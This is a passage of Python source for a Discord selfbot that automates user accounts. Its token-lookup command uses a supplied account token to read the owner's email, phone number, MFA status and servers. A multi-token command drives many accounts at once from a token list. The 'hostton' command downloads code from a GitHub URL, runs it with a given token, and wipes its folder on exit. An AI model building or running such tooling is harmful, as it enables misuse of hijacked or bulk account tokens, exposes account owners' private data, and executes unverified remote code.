                    'Content-Type': 'application/json'
                }
            ) as resp:
                if resp.status != 200:
                    await status_msg.edit(content=f"```{theme_primary}Failed to fetch token information{reset}```")
                    return
                
                user_data = await resp.json()
                
                async with session.get(
                    'https://discord.com/api/v9/users/@me/connections',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                ) as conn_resp:
                    connections = await conn_resp.json() if conn_resp.status == 200 else []

                async with session.get(
                    'https://discord.com/api/v9/users/@me/guilds',
                    headers={
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                ) as guild_resp:
                    guilds = await guild_resp.json() if guild_resp.status == 200 else []

                created_at = datetime.fromtimestamp(((int(user_data['id']) >> 22) + 1420070400000) / 1000)
                created_date = created_at.strftime('%Y-%m-%d %H:%M:%S')

                info = f"""```ansi
{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
                                {theme_primary}Token Account Information{reset}

                                {theme_secondary}Basic Information:{reset}
                                Username: {user_data['username']}#{user_data['discriminator']}
                                ID: {user_data['id']}
                                Email: {user_data.get('email', 'Not available')}
                                Phone: {user_data.get('phone', 'Not available')}
                                Created: {created_date}
                                Verified: {user_data.get('verified', False)}
                                MFA Enabled: {user_data.get('mfa_enabled', False)}

                                {theme_secondary}Nitro Status:{reset}
                                Premium: {bool(user_data.get('premium_type', 0))}
                                Type: {['None', 'Classic', 'Full'][user_data.get('premium_type', 0)]}

                                {theme_secondary}Stats:{reset}
                                Servers: {len(guilds)}
                                Connections: {len(connections)}

                                {theme_secondary}Profile:{reset}
                                Bio: {user_data.get('bio', 'No bio set')}
                                Banner: {'Yes' if user_data.get('banner') else 'No'}
                                Avatar: {'Yes' if user_data.get('avatar') else 'Default'}
{theme_secondary}─────────────────────────────────────────────────────────────────────────────────────────────────────────────{reset}
```"""

                await status_msg.edit(content=info)

    except Exception as e:
        await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")




@bot.command()
async def tstream(ctx, *, statuses_list: str = None):
    """Multi-token streaming status rotation"""
    tokens = load_tokens()
    total_tokens = len(tokens)
    
    if not statuses_list:
        await ctx.send(f"```{theme_primary}Please provide statuses | .tstream status1, status2, status3{reset}```")
        return

    # Parse statuses
    statuses = [status.strip() for status in statuses_list.split(',') if status.strip()]
    
    if not statuses:
        await ctx.send(f"```{theme_primary}No valid statuses provided{reset}```")
        return

    status_msg = await ctx.send(f"""```ansi
{theme_primary}Token Streaming Status{reset}
Total tokens available: {total_tokens}
How many tokens do you want to use? (Type 'all' or enter a number)```""")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        amount_msg = await bot.wait_for('message', timeout=20.0, check=check)
        amount = amount_msg.content.lower()
        
        if amount == 'all':
            selected_tokens = tokens
        else:
            try:
                num = int(amount)
                if num > total_tokens:
                    await status_msg.edit(content=f"```{theme_primary}Not enough tokens available{reset}```")
                    return
                selected_tokens = random.sample(tokens, num)
            except ValueError:
                await status_msg.edit(content=f"```{theme_primary}Invalid number{reset}```")
                return

        # Start streaming for all selected tokens
        streaming_tasks = []
        
        async def token_stream_loop(token, token_index):
            current_status_index = 0
            success_count = 0
            
            while True:
                try:
                    status_text = statuses[current_status_index % len(statuses)]
                    
                    # Set streaming activity for this token
                    headers = {
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                    
                    # Set custom status with streaming
                    status_data = {
                        'custom_status': {
                            'text': status_text
                        }
                    }
                    
                    async with aiohttp.ClientSession() as session:
                        async with session.patch(
                            'https://discord.com/api/v9/users/@me/settings',
                            headers=headers,
                            json=status_data
                        ) as resp:
                            if resp.status == 200:
                                success_count += 1
                    
                    # Update progress for this token
                    progress = f"""```ansi
{theme_primary}Token Streaming Status{reset}
Tokens: {len(selected_tokens)} | Statuses: {len(statuses)}
Progress: Token {token_index + 1} - {current_status_index + 1}/{len(statuses)}
Current: {status_text}
Success: {success_count} updates

{theme_secondary}Streaming rotation active...{reset}```"""
                    
                    await status_msg.edit(content=progress)
                    
                    # Rotate to next status
                    current_status_index += 1
                    await asyncio.sleep(8)  # Change status every 8 seconds
                    
                except Exception as e:
                    print(f"Error in token {token_index} stream: {e}")
                    await asyncio.sleep(5)
                    continue

        # Start streaming for each token
        for i, token in enumerate(selected_tokens):
            task = asyncio.create_task(token_stream_loop(token, i))
            streaming_tasks.append(task)
            await asyncio.sleep(0.5)  # Stagger token starts

        # Store tasks for potential stopping
        if not hasattr(bot, 'tstream_tasks'):
            bot.tstream_tasks = {}
        bot.tstream_tasks[ctx.channel.id] = streaming_tasks

        await ctx.send(f"```{theme_primary}Started streaming for {len(selected_tokens)} tokens with {len(statuses)} statuses{reset}```")

    except asyncio.TimeoutError:
        await status_msg.edit(content=f"```{theme_primary}Command timed out{reset}```")
    except Exception as e:
        await status_msg.edit(content=f"```{theme_primary}An error occurred: {str(e)}{reset}```")

@bot.command()
async def tstreamoff(ctx):
    """Stop all token streaming"""
    if hasattr(bot, 'tstream_tasks') and ctx.channel.id in bot.tstream_tasks:
        tasks = bot.tstream_tasks[ctx.channel.id]
        for task in tasks:
            task.cancel()
        del bot.tstream_tasks[ctx.channel.id]
        await ctx.send(f"```{theme_primary}Stopped all token streaming{reset}```")
    else:
        await ctx.send(f"```{theme_primary}No token streaming active{reset}```")

@bot.command()
async def tss(ctx):
    """Check token streaming status"""
    if hasattr(bot, 'tstream_tasks') and ctx.channel.id in bot.tstream_tasks:
        tasks = bot.tstream_tasks[ctx.channel.id]
        active_tasks = sum(1 for task in tasks if not task.done())
        await ctx.send(f"```{theme_primary}Token Streaming Status: {active_tasks}/{len(tasks)} tokens active{reset}```")
    else:
        await ctx.send(f"```{theme_primary}No token streaming active{reset}```")
@bot.command()
async def hostton(ctx, token: str):
    """Host a token in a separate selfbot instance"""
    try:
        await ctx.message.delete()
        
        current_dir = os.getcwd()
        xlegacy_host_path = os.path.join(current_dir, "Xlegacy_host")
        
        # Create directory if it doesn't exist
        os.makedirs(xlegacy_host_path, exist_ok=True)
        
        config_path = os.path.join(xlegacy_host_path, "config.json")
        
        # First, get the username from the token to name the file
        async def get_username(token):
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        'https://discord.com/api/v9/users/@me',
                        headers=headers
                    ) as resp:
                        if resp.status == 200:
                            user_data = await resp.json()
                            return user_data['username']
                        else:
                            return "unknown"
            except:
                return "unknown"
        
        # Get username for the file name
        username = await get_username(token)
        safe_username = "".join(c for c in username if c.isalnum() or c in (' ', '-', '_')).rstrip()
        if not safe_username:
            safe_username = "hosted_bot"
        
        bot_file_path = os.path.join(xlegacy_host_path, f"{safe_username}.py")
        
        # Create config file with both TOKEN and token keys for compatibility
        config = {
            "token": token,
            "TOKEN": token  # Add uppercase version too
        }
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4)
        
        # Load bot code from GitHub and modify it for hosted environment
        async def download_and_modify_bot_code():
            github_url = "https://raw.githubusercontent.com/jayden-so/Xlegacy-client/refs/heads/main/main.py"
            async with aiohttp.ClientSession() as session:
                async with session.get(github_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # MODIFY THE DOWNLOADED CODE FOR HOSTED ENVIRONMENT
                        # Add path fixing and cleanup at the very beginning
                        path_fix_code = '''
import os
import sys
import atexit
import shutil

# FIX PATHS FOR HOSTED ENVIRONMENT
current_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(current_dir)
sys.path.insert(0, current_dir)

# CLEANUP FUNCTION TO DELETE FOLDER ON EXIT
def cleanup_on_exit():
    try:
        # Wait a moment to ensure everything is closed
        import time
        time.sleep(1)
        
        # Get the directory containing this script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        parent_dir = os.path.dirname(script_dir)
        host_folder = "Xlegacy_host"
        full_host_path = os.path.join(parent_dir, host_folder)
        
        # Check if we're in the Xlegacy_host folder
        if os.path.basename(script_dir) == host_folder:
            # Delete the entire host folder
            if os.path.exists(full_host_path):
                shutil.rmtree(full_host_path, ignore_errors=True)
                print(f"Cleaned up host folder: {full_host_path}")
    except Exception as e:
        print(f"Cleanup error: {e}")

# Register cleanup function
atexit.register(cleanup_on_exit)

'''
                        
                        # Find where the imports start and insert our path fix
                        lines = content.split('\n')
                        new_lines = []
                        
                        # Add our path fix after the imports begin
                        imports_added = False
                        for i, line in enumerate(lines):
                            new_lines.append(line)
                            # Look for the first import or the main code section
                            if (line.startswith('import ') or line.startswith('from ')) and not imports_added:
                                # Add our path fixing code after the first import block
                                if i + 1 < len(lines) and (not lines[i + 1].startswith('import ') and not lines[i + 1].startswith('from ')):
                                    new_lines.append(path_fix_code.strip())
                                    imports_added = True
                        
                        # If we didn't find a good spot, add it after the first few lines
                        if not imports_added and len(new_lines) > 3:
                            new_lines.insert(3, path_fix_code.strip())
                        
                        modified_content = '\n'.join(new_lines)
                        
                        # FIX THE TOKEN LOADING - Handle both 'token' and 'TOKEN'
                        modified_content = modified_content.replace(
                            "token = config['TOKEN']",
                            "token = config.get('TOKEN') or config.get('token')"
                        )
                        
                        modified_content = modified_content.replace(
                            'token = config["TOKEN"]',
                            'token = config.get("TOKEN") or config.get("token")'
                        )
                        
                        # Also add a fallback for any other token access patterns
                        modified_content = modified_content.replace(
                            "config['TOKEN']",
                            "config.get('TOKEN', config.get('token', ''))"
                        )
                        
                        modified_content = modified_content.replace(
                            'config["TOKEN"]',
                            'config.get("TOKEN", config.get("token", ""))'
                        )
                        
                        # Add error handling for file operations
                        modified_content = modified_content.replace(
                            'with open(config_path, \'r\') as f:',
                            'with open(config_path, \'r\', encoding=\'utf-8\') as f:'
                        )
                        
                        # Modify the stop command to include cleanup
                        if '@bot.command()' in modified_content and 'async def stop(' in modified_content:
                            # Find and replace the stop command
                            import re
                            stop_pattern = r'(@bot\.command\(\)\s*async def stop\(ctx\):.*?await bot\.close\(\))'
                            new_stop_command = '''@bot.command()
async def stop(ctx):
    """Stop the hosted instance and clean up files"""
    await ctx.send("Stopping hosted instance and cleaning up...")
    # Trigger cleanup before closing
    import shutil
    import os
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        if os.path.exists(current_dir):
            # Schedule cleanup after bot closes
            import asyncio
            asyncio.create_task(final_cleanup(current_dir))
    except Exception as e:
        print(f"Cleanup setup error: {e}")
    await bot.close()

async def final_cleanup(folder_path):
    """Perform final cleanup after bot closes"""
    await asyncio.sleep(2)  # Wait for bot to fully close
    try:
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path, ignore_errors=True)
            print(f"Successfully cleaned up: {folder_path}")
    except Exception as e:
        print(f"Final cleanup error: {e}")'''
                            
                            modified_content = re.sub(stop_pattern, new_stop_command, modified_content, flags=re.DOTALL)
                        
                        return modified_content
                    else:
                        raise Exception(f"Failed to download code from GitHub: {response.status}")
        
        # Download and modify the bot code
        bot_code = await download_and_modify_bot_code()
        
        # Write the bot file with UTF-8 encoding
        with open(bot_file_path, 'w', encoding='utf-8') as f:
            f.write(bot_code)
        
        # Start the hosted bot
        if os.name == 'nt':  # Windows
            process = subprocess.Popen(
                [sys.executable, bot_file_path],
                cwd=xlegacy_host_path,
                creationflags=subprocess.CREATE_NEW_CONSOLE
            )
        else:  # Linux/Mac
            process = subprocess.Popen(
                ["python3", bot_file_path],
                cwd=xlegacy_host_path
            )
        
        await ctx.send(f"```{theme_primary}Successfully started host for user: {username}{reset}```", delete_after=5)
        await ctx.send(f"```{theme_primary}Folder will auto-delete when bot stops{reset}```", delete_after=5)
        
    except Exception as e:
        await ctx.send(f"```{theme_primary}Error: {str(e)}{reset}```", delete_after=5)
    except Exception as e:
        await ctx.send(f"```{theme_primary}Error: {str(e)}{reset}```", delete_after=5)
        
import json

# Read token from config.json
with open('config.json', 'r') as config_file:
    config = json.load(config_file)
    token = config['TOKEN']

# Use the token
bot.run(token, bot=False)  
